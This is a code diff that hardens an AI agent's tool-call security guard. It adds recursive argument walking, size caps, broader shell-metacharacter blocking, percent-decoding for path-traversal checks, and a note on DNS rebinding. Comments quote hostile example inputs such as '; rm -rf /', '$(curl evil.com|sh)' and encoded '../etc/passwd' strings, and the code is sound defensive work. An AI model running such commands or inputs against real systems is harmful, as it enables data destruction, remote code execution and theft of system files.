@@ -10,12 +10,18 @@ Checks run in order, short-circuiting on the first hard stop:
    `config.firewall.default_workflow_mode` (restrictive by default).
 4. **Schema validation** — `jsonschema` against `ToolManifest.input_schema`
    (`SCHEMA_VIOLATION`).
-5. For every string argument:
+5. For every string argument -- found by recursively walking the (possibly
+   nested) argument structure, not just its top-level keys
+   (`_iter_string_arguments`):
+   - **Size cap** (`CONTENT_TOO_LARGE`) — reject any individual value over
+     `runtime_limits.max_content_length` before any check below runs over
+     it.
    - **SSRF** (`SSRF`) — resolve URL/host-like values and reject
      private/loopback/link-local/reserved ranges (covers cloud metadata
      endpoints and DNS rebinding).
-   - **Path traversal** (`PATH_TRAVERSAL`) — normalize path-like values
-     against `tool_guard.workspace_root`.
+   - **Path traversal** (`PATH_TRAVERSAL`) — percent-decode and normalize
+     backslashes, then normalize path-like values against
+     `tool_guard.workspace_root`.
    - **Command injection** (`COMMAND_INJECTION`) — reject shell
      metacharacters for `action_type == EXECUTE` tools.
    - **Egress allow-list** (`EGRESS_DENIED`) — for tools with
@@ -38,7 +44,8 @@ import ipaddress
 import os
 import re
 import socket
-from urllib.parse import urlparse
+from collections.abc import Iterator
+from urllib.parse import unquote, urlparse
 
 import jsonschema
 
@@ -72,7 +79,14 @@ _HARD_STOP_TYPES = {
     FindingType.COMMAND_INJECTION,
     FindingType.EGRESS_DENIED,
     FindingType.SECRET,
+    FindingType.CONTENT_TOO_LARGE,
 }
+
+# Hard cap on how many nodes `_iter_string_arguments` will visit when
+# recursively walking a tool call's arguments. Bounds the cost of walking a
+# deliberately deep/wide nested argument structure -- once the cap is hit the
+# walk simply stops (a still-finite amount of work was done; nothing raises).
+_MAX_ARGUMENT_NODES = 1000
 
 # Provenance labels that mark content as having originated *outside* direct,
 # trusted user input -- e.g. fetched from the web, returned by a previous
@@ -97,9 +111,12 @@ _PATH_KEY_RE = re.compile(r"(path|file|dir|directory|folder)", re.IGNORECASE)
 # Shell metacharacters that, if present in an argument passed to an EXECUTE
 # tool, could be used to break out of the intended single command and chain
 # on additional shell commands (e.g. "; rm -rf /", "$(curl evil.com|sh)",
-# "`whoami`", "a && b", pipes, redirection, backslash-escapes, or embedded
-# newlines that start a new logical command).
-_SHELL_METACHARS = set(";|&`$()<>\\\n")
+# "`whoami`", "a && b", pipes, redirection, backslash-escapes, embedded
+# newlines/tabs that start a new logical command or argument, brace/tilde
+# expansion (`{a,b}`, `~user`), or an embedded NUL byte (which some shells/
+# libc argument parsers treat as a string terminator, letting trailing
+# bytes after it be smuggled past a naive substring check).
+_SHELL_METACHARS = set(";|&`$()<>\\\n\t{}~\x00")
 
 # Hostnames that are blocked outright regardless of how they resolve in DNS,
 # because they are reliably used to reach sensitive local/internal services:
@@ -214,14 +231,26 @@ def evaluate(
             )
             return _verdict(DecisionAction.DENY, [finding], [finding.message])
 
-    # Step 5: content-based checks on every string-valued argument. Each
-    # helper inspects the (key, value) pair independently and returns zero
-    # or more Findings; non-string arguments (ints, bools, nested dicts/
-    # lists) are skipped since these checks are all about strings that might
-    # encode a URL, a filesystem path, or shell input.
+    # Step 5: content-based checks on every string-valued argument, found by
+    # recursively walking the (possibly nested) argument structure -- a
+    # string buried in a list of dicts (e.g. `files: [{"path": "../etc"}]`)
+    # gets exactly the same SSRF/path-traversal/command-injection/egress/
+    # credential checks as a top-level string argument. Each individual
+    # value is also capped at `runtime_limits.max_content_length` before any
+    # check runs over it, since an oversized value is itself a resource-
+    # exhaustion risk independent of what the checks would find in it.
     findings: list[Finding] = []
-    for key, value in (policy_input.arguments or {}).items():
-        if not isinstance(value, str):
+    max_length = config.runtime_limits.max_content_length
+    for key, value in _iter_string_arguments(policy_input.arguments or {}):
+        if len(value) > max_length:
+            findings.append(
+                Finding(
+                    type=FindingType.CONTENT_TOO_LARGE,
+                    detector="tool_guard:max_content_length",
+                    severity=RiskTier.HIGH,
+                    message=f"argument '{key}' ({len(value)} chars) exceeds max_content_length ({max_length})",
+                )
+            )
             continue
         findings.extend(_check_ssrf(key, value, manifest))
         findings.extend(_check_path_traversal(key, value, manifest, config))
@@ -316,6 +345,45 @@ def _verdict(
         reasons=reasons,
         required_approvals=required_approvals or [],
     )
+
+
+def _iter_string_arguments(value: object, key_path: str = "") -> Iterator[tuple[str, str]]:
+    """Recursively walk a tool-call argument value -- which may be an
+    arbitrarily nested combination of dicts, lists/tuples, and scalars --
+    yielding every string leaf found, paired with its dotted/indexed key
+    path (e.g. `"options.path"` or `"files[0].path"`).
+
+    Tool-call arguments are not always a flat `str -> str` mapping: callers
+    routinely pass a list of file descriptors, or a dict of nested options,
+    either of which may itself contain a path/URL/secret that needs the same
+    SSRF/path-traversal/command-injection/egress/credential checks as a
+    top-level string argument. Iterating only `arguments.items()` directly
+    (as this guard originally did) silently skipped every nested string,
+    which was a complete bypass of every content-based check in `evaluate()`
+    for any caller that nested its arguments even one level deep.
+
+    Implemented iteratively (an explicit stack, not recursion) so a
+    deliberately deep structure can't trigger a `RecursionError`, and capped
+    at `_MAX_ARGUMENT_NODES` total visited nodes so a deliberately deep/wide
+    structure can't be used to exhaust CPU/memory before the walk completes
+    -- once the cap is hit, the walk simply stops early.
+    """
+
+    stack: list[tuple[str, object]] = [(key_path, value)]
+    visited = 0
+    while stack:
+        path, current = stack.pop()
+        visited += 1
+        if visited > _MAX_ARGUMENT_NODES:
+            return
+        if isinstance(current, str):
+            yield path, current
+        elif isinstance(current, dict):
+            for k, v in current.items():
+                stack.append((f"{path}.{k}" if path else str(k), v))
+        elif isinstance(current, (list, tuple)):
+            for i, v in enumerate(current):
+                stack.append((f"{path}[{i}]", v))
 
 
 def _triggering_provenance(policy_input: PolicyInput) -> set[ProvenanceLabel]:
@@ -474,6 +542,24 @@ def _check_ssrf(key: str, value: str, manifest: ToolManifest) -> list[Finding]:
 
     Returns a single CRITICAL `SSRF` Finding (in a list) on any of these
     matches, or an empty list if the argument is clean.
+
+    **Known limitation (TOCTOU / DNS rebinding):** the DNS resolution in
+    step 5 happens *now*, at authorization time -- not at the moment the
+    wrapped tool actually opens the connection. An attacker controlling the
+    DNS record for an approved-looking hostname can serve a public IP for
+    this lookup and then "rebind" the record to an internal address before
+    the tool's own (separate) resolution happens microseconds-to-seconds
+    later, slipping past this check entirely. This guard cannot close that
+    gap by itself, because it has no hook into the tool's actual network
+    call -- a complete fix requires either (a) the tool implementation
+    resolving the host once and reusing that pinned IP for the connection
+    (e.g. via `requests`' `Session` with a custom `HTTPAdapter`, or
+    `urllib3`'s `HTTPConnectionPool(..., server_hostname=...)`), or (b) the
+    SSRF check being re-run with the IP frozen at request time rather than
+    re-resolved. Treat this check as a strong best-effort filter, not a
+    substitute for network-level egress controls (e.g. a NAT/firewall
+    blocking RFC 1918 and link-local destinations for the agent's runtime
+    regardless of what the application layer decided).
     """
 
     ip_literal = _looks_like_ip_literal(value)
@@ -556,12 +642,22 @@ def _check_path_traversal(key: str, value: str, manifest: ToolManifest, config: 
        `_check_ssrf`/`_check_egress` instead) -- extract the filesystem
        path portion (`.path` or, if empty, `.netloc`, to handle
        `file://etc/passwd`-style URLs missing the third slash).
-    3. Skip the check entirely unless either the argument name looks
+    3. Percent-decode the path (repeatedly, up to a small fixed number of
+       passes, to also catch double-encoding like `%252e%252e`) and
+       normalize any backslash to a forward slash. Without this, an
+       argument like `"..%2f..%2fetc%2fpasswd"` or (on a worker invoked from
+       a Windows-style path library) `"..\\..\\etc\\passwd"` would reach
+       `os.path.normpath` still encoded/backslash-separated -- on POSIX,
+       `normpath` treats `%2f` and `\\` as ordinary filename characters, not
+       path separators, so the `../` traversal segments are never collapsed
+       and the check below sees a harmless-looking single path component
+       instead of an escape attempt.
+    4. Skip the check entirely unless either the argument name looks
        path-like (`_PATH_KEY_RE`, e.g. "path"/"file"/"dir") or the tool's
        `action_type` is one of READ/WRITE/DELETE (a filesystem-touching
        operation) -- avoids false positives on unrelated string arguments
        for tools that don't touch the filesystem.
-    4. Resolve the value to an absolute, normalized path: if it's already
+    5. Resolve the value to an absolute, normalized path: if it's already
        absolute, normalize it as-is (this is what catches `/etc/passwd`);
        if relative, join it onto `workspace_root` first (this is what
        catches `../../etc/passwd` after `os.path.normpath` collapses the
@@ -588,6 +684,14 @@ def _check_path_traversal(key: str, value: str, manifest: ToolManifest, config: 
         path_value = parsed.path or parsed.netloc
         if not path_value:
             return []
+
+    decoded = path_value
+    for _ in range(3):
+        next_decoded = unquote(decoded)
+        if next_decoded == decoded:
+            break
+        decoded = next_decoded
+    path_value = decoded.replace("\\", "/")
 
     if not (_PATH_KEY_RE.search(key) or manifest.action_type in (ActionType.READ, ActionType.WRITE, ActionType.DELETE)):
         return []
